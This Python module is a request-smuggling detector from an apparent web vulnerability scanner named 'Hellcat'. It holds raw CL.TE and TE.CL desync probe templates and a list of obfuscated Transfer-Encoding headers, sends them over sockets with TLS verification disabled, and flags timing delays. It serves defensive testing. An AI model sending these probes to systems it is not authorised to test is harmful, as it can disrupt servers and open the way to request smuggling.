"""
Hellcat HTTP Request Smuggling Detector
========================================
CL.TE / TE.CL / H2.CL desync detection via time-based probes.
Inspired by defparam/smuggler + PortSwigger research.
"""
from __future__ import annotations

import logging
import socket
import ssl
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

from hellcat.core.detectors import BaseDetector, register_detector
from hellcat.core.models import DetectionResult, DetectorType, Severity

logger = logging.getLogger("hellcat.smuggling")

# CL.TE probe: backend reads Transfer-Encoding, frontend reads Content-Length
CLTE_PROBE = (
    "{method} {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: {cl}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

# TE.CL probe: frontend reads Transfer-Encoding, backend reads Content-Length
TECL_PROBE = (
    "{method} {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "1\r\n"
    "Z\r\n"
    "Q\r\n"
    "\r\n"
)

# TE.TE obfuscation variants
TE_OBFUSCATIONS = [
    "Transfer-Encoding: chunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
    "Transfer-Encoding:\tchunked",
    "X: x\r\nTransfer-Encoding: chunked",
    "Transfer-Encoding\r\n: chunked",
]


@register_detector("http_smuggling", {"owasp": "A05:2021"})
class HTTPSmugglingDetector(BaseDetector):
    name = "http_smuggling"
    description = "HTTP Request Smuggling (CL.TE / TE.CL / TE.TE desync)"
    vuln_type = "HTTP Request Smuggling"
    severity = Severity.CRITICAL
    detector_type = DetectorType.REQUEST

    def detect(self, url: str, **kwargs: Any) -> List[DetectionResult]:
        self._log_start(url)
        results: List[DetectionResult] = []
        parsed = urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        use_ssl = parsed.scheme == "https"
        timeout = kwargs.get("timeout", 10)

        # Test CL.TE
        clte = self._probe(host, port, path, use_ssl, "CLTE", timeout)
        if clte.get("vulnerable"):
            results.append(self._create_result(
                url, payload="CL.TE desync probe",
                evidence=f"CL.TE: response delay {clte['delay']:.1f}s (threshold: {timeout}s)",
                confidence=0.80,
                remediation="Normalize Transfer-Encoding handling, disable HTTP/1.1 keep-alive to untrusted backends",
                extra=clte,
            ))

        # Test TE.CL
        tecl = self._probe(host, port, path, use_ssl, "TECL", timeout)
        if tecl.get("vulnerable"):
            results.append(self._create_result(
                url, payload="TE.CL desync probe",
                evidence=f"TE.CL: response delay {tecl['delay']:.1f}s",
                confidence=0.80,
                remediation="Normalize Transfer-Encoding, reject ambiguous requests",
                extra=tecl,
            ))

        self._log_end(url, results)
        return results

    def _probe(self, host: str, port: int, path: str, use_ssl: bool,
               probe_type: str, timeout: int) -> Dict[str, Any]:
        template = CLTE_PROBE if probe_type == "CLTE" else TECL_PROBE
        body_len = len("0\r\n\r\nG") if probe_type == "CLTE" else 4
        raw = template.format(method="POST", path=path, host=host, cl=body_len)
        try:
            sock = socket.create_connection((host, port), timeout=5)
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.settimeout(timeout)
            sock.sendall(raw.encode())
            start = time.time()
            try:
                resp = sock.recv(4096)
                delay = time.time() - start
            except socket.timeout:
                delay = time.time() - start
                resp = b""
            sock.close()
            # If delay > threshold, likely desync (backend hung waiting)
            vulnerable = delay >= (timeout * 0.8)
            return {"probe": probe_type, "delay": round(delay, 2),
                    "vulnerable": vulnerable, "response_len": len(resp)}
        except Exception as exc:
            return {"probe": probe_type, "error": str(exc), "vulnerable": False}
